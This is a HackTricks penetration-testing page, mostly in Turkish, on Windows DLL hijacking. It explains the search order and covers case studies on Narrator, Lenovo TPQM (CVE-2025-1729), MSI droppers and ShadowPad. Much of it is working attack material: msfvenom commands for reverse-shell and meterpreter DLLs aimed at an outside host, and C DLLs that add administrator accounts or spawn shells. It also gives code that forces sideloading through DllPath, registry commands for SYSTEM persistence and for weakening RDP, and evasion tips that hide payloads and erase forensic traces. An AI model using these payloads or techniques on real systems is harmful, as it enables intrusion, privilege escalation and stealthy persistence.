# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, persistence elde etme ve daha az yaygın olarak privilege escalation için kullanılır. Buradaki odak yükseltme olsa da, hijacking yöntemi hedeflerden bağımsız olarak aynıdır.

### Yaygın Yöntemler

DLL hijacking için birkaç yöntem kullanılır; her birinin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:

1. **DLL Replacement**: Gerçek bir DLL ile kötü amaçlı bir DLL'in yer değiştirilmesi; orijinal DLL'in işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanılabilir.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olanın önünde aranacak bir yola yerleştirerek uygulamanın arama deseninden yararlanma.
3. **Phantom DLL Hijacking**: Uygulamanın mevcut olmayan bir gereklilik DLL'i sanarak yükleyeceği kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamanın kötü amaçlı DLL'e yönelmesi için %PATH% veya .exe.manifest / .exe.local dosyaları gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Replacement**: WinSxS dizininde meşru DLL'in yerine kötü amaçlı bir karşılık koyma; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı kontrolündeki bir dizine koyma; Binary Proxy Execution tekniklerine benzer.

> [!TIP]
> DLL sideloading üzerine HTML staging, AES-CTR konfigürasyonları ve .NET implantlarını katmanlandıran adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Bir sistem içindeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** **ayarlamaktır**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Eğer **genel olarak eksik dll'ler** arıyorsanız bu kaydı birkaç **saniye** çalışır durumda **bırakırsınız**.\
Belirli bir yürütülebilir dosya içinde **eksik bir dll** arıyorsanız, **başka bir filtre** olarak "Process Name" "contains" `<exec name>` gibi bir filtre ayarlamalı, programı çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Eksik Dll'leri Sömürme

Yetki yükseltmesi için en iyi şansımız, bir privilege sürecinin yüklemeye çalışacağı bir dll'i yazabilmektir; bu dll'in aranacağı yerlerden birine yazma yetkisi elde etmektir. Bu nedenle, dll'in orijinalinin bulunduğu klasörden **önce** aranacağı bir klasöre dll yazabiliyor olabiliriz (tuhaf vakalar) ya da dll'in herhangi bir klasörde bulunmadığı ve arama yapılacak bir klasöre yazma imkânımız olabilir.

### Dll Arama Sırası

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde Dll'lerin nasıl yüklendiğini ayrıntılı şekilde bulabilirsiniz.

Windows uygulamaları DLL'leri belirli bir sıra izleyen ön tanımlı arama yolları boyunca arar. DLL hijacking problemi, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesiyle ortaya çıkar; böylece meşru DLL'den önce yüklenir. Bunu önlemenin bir çözümü, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

32-bit sistemlerde DLL arama sırası aşağıdadır:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt anahtarında belirtilen uygulama başına yolunu içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkinleştirildiğinde olan **varsayılan** arama sırasıdır. Bu özellik devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama LoadLibraryEx'in yüklemekte olduğu yürütülebilir modülün dizininde başlar.

Son olarak, bir dll yalnızca adı belirtilerek yüklenmek yerine mutlak yol belirtilerek de yüklenebilir. Bu durumda o dll **sadece** belirtilen yolda aranacaktır (dll'in herhangi bir bağımlılığı varsa, onlar isimle yüklendiği gibi aranacaktır).

Arama sırasını değiştirmeye yönelik başka yollar da vardır fakat burada onları açıklamayacağım.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu belirleyici şekilde etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin vererek, hedef süreç bir DLL'i isimle (mutlak yol olmadan ve safe loading bayraklarını kullanmadan) çözdüğünde, yükleyici o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Ana fikir
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve DllPath olarak kontrolünüzdeki klasöre işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef binary bir DLL'i isimle çözdüğünde, loader bu sağlanan DllPath'i çözümleme sırasında danışacak ve kötü amaçlı DLL hedef EXE ile aynı konumda olmasa bile güvenilir sideloading sağlayacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan child process'i etkiler; mevcut işlemi etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL'i isimle import etmeli veya LoadLibrary ile yüklemelidir (mutlak yol olmadan ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalıdır).
- KnownDLLs ve sert kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata işlemi):

<details>
<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Zararlı bir xmllite.dll (gerekli exportları sağlayan veya gerçekine proxy yapan) dosyasını DllPath dizininize koyun.
- Yukarıdaki teknikle adıyla xmllite.dll aradığı bilinen imzalı bir signed binary başlatın. Yükleyici importu sağlanan DllPath üzerinden çözer ve DLL'inizi sideload eder.

Bu teknik, sahada multi-stage sideloading zincirlerini tetikleyecek şekilde gözlemlenmiştir: ilk bir launcher bir yardımcı DLL bırakır, bu DLL daha sonra Microsoft-signed, hijackable bir ikiliyi özel bir DllPath ile başlatarak saldırganın DLL'inin bir staging directory'den yüklenmesini zorlar.


#### Windows belgelerindeki DLL arama sırasına ilişkin istisnalar

Windows dokümantasyonunda standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Eğer **bellekte zaten yüklü olan biriyle aynı adına sahip bir DLL** ile karşılaşılırsa, sistem olağan aramayı atlar. Bunun yerine, yönlendirme ve bir manifest için bir kontrol gerçekleştirir; aksi takdirde bellekten zaten bulunan DLL kullanılmadan önce bu kontroller yapılır. **Bu durumda sistem DLL için bir arama yapmaz**.
- DLL, mevcut Windows sürümü için bir **known DLL** olarak tanındığında, sistem kendi known DLL sürümünü ve onun bağımlı DLL'lerini kullanır; **arama sürecini atlar**. Bu known DLL'lerin listesi kayıt defterinde **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** anahtarında tutulur.
- Bir **DLL'in bağımlılıkları** varsa, bu bağımlı DLL'lerin aranması, ilk DLL tam yol ile tanımlanmış olsa bile, sadece **module isimleriyle** belirtilmiş gibi gerçekleştirilir.

### Ayrıcalık Yükseltme

**Gereksinimler**:

- Farklı ayrıcalıklarla çalışan veya çalışacak (yatay veya lateral hareket için) ve **DLL eksikliği olan** bir process tespit edin.
- **DLL'in aranacağı** herhangi bir **dizine** yazma erişiminizin olduğundan emin olun. Bu konum, executable'ın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak ayrıcalıklı bir executable'ın DLL eksikliği olması gariptir** ve bir de **system path klasöründe yazma iznine sahip olmak daha da gariptir** (varsayılan olarak sahip olamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana hedefi UAC'yi bypass etmek** olsa bile, büyük olasılıkla kullanabileceğiniz belirli bir Windows sürümü için bir **PoC** veya Dll hijacking örneği bulabilirsiniz (muhtemelen sadece yazma izninizin olduğu klasörün yolunu değiştirmeniz yeterli olacaktır).

Bir klasördeki izinlerinizi **şu şekilde kontrol edebileceğinizi** unutmayın:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'larını ve bir dll'in exports'larını şu şekilde kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sistem PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol edecektir.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dir.

### Örnek

Eğer istismara uygun bir senaryo bulursanız, bunu başarılı şekilde kullanmanın en önemli noktalarından biri, çalıştırılacak executable'ın ondan import edeceği tüm fonksiyonları en azından dışa aktaran bir dll **oluşturmaktır**. Ayrıca unutmayın ki Dll Hijacking, [Medium Integrity level'den High'a **(UAC'yi atlayarak)** yükselmek için](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system) yükselmek için kullanılabilir. Bu konuda yürütme amaçlı dll hijacking üzerine odaklanan çalışma içinde **geçerli bir dll'in nasıl oluşturulacağına** dair bir örnek bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, sonraki bölümde şablon olarak veya gerekmeyen fonksiyonları da dışa aktaran bir dll oluşturmak için kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **kötü amaçlı kodunuzu çalıştırabilen**, ancak aynı zamanda **beklendiği gibi çalışmak** için gerçek kütüphaneye yapılan tüm çağrıları **iletip** **açığa çıkaran** bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracı ile aslında **bir executable belirtip proxify etmek istediğiniz kütüphaneyi seçebilir** ve **proxified dll üretebilir** veya **Dll'i belirterek** **proxified dll üretebilirsiniz**.

### **Meterpreter**

**rev shell (x64) elde et:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) alın:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Birçok durumda derlediğiniz Dll'in hedef süreç tarafından yüklenecek birkaç işlevi **export several functions** olarak dışa aktarması gerektiğini unutmayın; bu işlevler mevcut değilse **binary won't be able to load** ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL örneği (kullanıcı oluşturma ile)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı giriş noktası olan alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlatıldığında tahmin edilebilir, dile özgü bir yerelleştirme DLL'ini sorgulamaya devam eder; bu DLL ele geçirilerek keyfi kod çalıştırma ve kalıcılık sağlanabilir.

Temel bilgiler
- Arama yolu (mevcut sürümlerde): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer OneCore yolunda yazılabilir, saldırgan kontrollü bir DLL mevcutsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Hiçbir export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yüklenme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Basit bir hijack, UI'yi konuşur/vurgular. Sessiz kalmak için, attach sırasında Narrator iş parçacıklarını listeleyin, ana iş parçacığını açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile askıya alın; kendi iş parçacığınızda devam edin. Tam kod için PoC'e bakın.

Trigger and persistence via Accessibility configuration
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdaki ile Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın.

RDP-triggered SYSTEM execution (lateral movement)
- Classic RDP security layer'a izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, oturum açma ekranında CTRL+WIN+ENTER ile Narrator'ı başlatın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- Yürütme RDP oturumu kapandığında durur — hızla inject/migrate yapın.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt girdisini (ör. CursorIndicator) klonlayabilir, rastgele bir ikili/DLL'ye işaret edecek şekilde düzenleyip içe aktarabilir, sonra `configuration`'ı o AT adına ayarlayabilirsiniz. Bu, Accessibility çerçevesi altında keyfi yürütmeyi sağlar.

Notlar
- `%windir%\System32` altına yazma ve HKLM değerlerini değiştirme admin hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekli değildir.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu vaka, Lenovo'nun TrackPoint Quick Menu'sünde (`TPQMAssistant.exe`) Phantom DLL Hijacking'i göstermektedir; takip numarası **CVE-2025-1729**.

### Zafiyet Detayları

- **Component**: `TPQMAssistant.exe` konumu: `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün saat 09:30'da oturum açmış kullanıcı bağlamında çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir, yerel kullanıcıların rastgele dosya bırakmasına izin verir.
- **DLL Search Behavior**: Çalışma dizininden önce `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" kaydı bırakır; bu, yerel dizin aramasının öncelikli olduğunu gösterir.

### Exploit Implementation

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirebilir, eksik DLL'i sömürerek kullanıcının bağlamında kod yürütmeyi gerçekleştirebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak, `hostfxr.dll`'i `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında saat 09:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturumu açıksa, kötü amaçlı DLL yönetici oturumunda medium integrity seviyesinde çalışır.
4. Standart UAC bypass tekniklerini zincirleyerek medium integrity'den SYSTEM ayrıcalıklarına yükseltin.

## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri genellikle MSI-based droppers ile DLL side-loading'i birleştirerek payloadları güvenilen, imzalı bir süreç altında çalıştırır.

Zincir özeti
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Pratik sideloading wsc_proxy.exe ile
- Bu iki dosyayı aynı klasöre koyun:
- wsc_proxy.exe: meşru imzalı host (Avast). Süreç dizininden wsc.dll'i adla yüklemeye çalışır.
- wsc.dll: saldırgan DLL. Eğer belirli exports gerekmezse, DllMain yeterli olabilir; aksi takdirde, bir proxy DLL oluşturun ve gerekli exportsları gerçek kütüphaneye iletirken payload'u DllMain'de çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus gibi) kullanın.

- Bu teknik, host binary tarafından yapılan DLL ad çözümlemesine dayanır. Host mutlak yollar veya safe loading flag'leri (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export setini seçerken bunlar göz önünde bulundurulmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon'ın ShadowPad'i disk üzerinde çekirdek payload'ı şifreli tutarken meşru yazılımlarla karışmak için nasıl bir **three-file triad** kullandığını açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi satıcılar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar yürütülebilir dosyanın adını Windows ikili dosyası gibi görünmesi için yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode imzası geçerli kalır.
2. **Malicious loader DLL** – EXE'nin yanına beklenen bir adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile ofuske edilmiş bir MFC binary'sidir; tek görevi şifreli blob'u bulmak, şifre çözmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifre çözülmüş payload hafızaya map edildikten sonra, loader adli TMP dosyasını adli izleri yok etmek için siler.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header'daki orijinal `OriginalFileName`'ı koruyarak), Windows ikilisiymiş gibi davranmasını sağlar ancak satıcı imzasını muhafaza eder; bu yüzden Ink Dragon'ın yaptığı gibi gerçekte AMD/NVIDIA yardımcı programı olan `conhost.exe` görünümlü ikililer bırakma alışkanlığını taklit edin.
* Yürütülebilir dosya güvenirliğini koruduğu için, çoğu allowlisting kontrolü genellikle kötü amaçlı DLL'in aynı dizinde bulunmasını yeterli görür. Loader DLL'i özelleştirmeye odaklanın; imzalı parent genellikle dokunulmadan çalıştırılabilir.
* ShadowPad'in decryptor'ı TMP blob'un loader ile aynı dizinde olmasını ve haritalanmadan önce yazılabilir olmasını bekler, böylece dosyayı sıfırlayabilir. Payload yüklenene kadar dizini yazılabilir tutun; hafızaya alındıktan sonra TMP dosyası OPSEC için güvenle silinebilir.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
